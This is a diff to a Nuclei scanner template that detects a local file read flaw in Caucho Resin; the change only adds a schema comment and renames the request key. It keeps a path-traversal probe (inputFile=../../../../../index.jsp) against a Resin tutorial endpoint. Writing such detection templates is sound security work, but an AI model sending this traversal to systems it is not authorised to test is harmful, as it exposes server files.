@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: resin-inputfile-fileread
 info:
   name: Caucho Resin LFR
@@ -7,7 +8,7 @@ info:
   tags: resin,caucho,lfr
   reference: https://blkstone.github.io/2017/10/30/resin-attack-vectors/
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp"
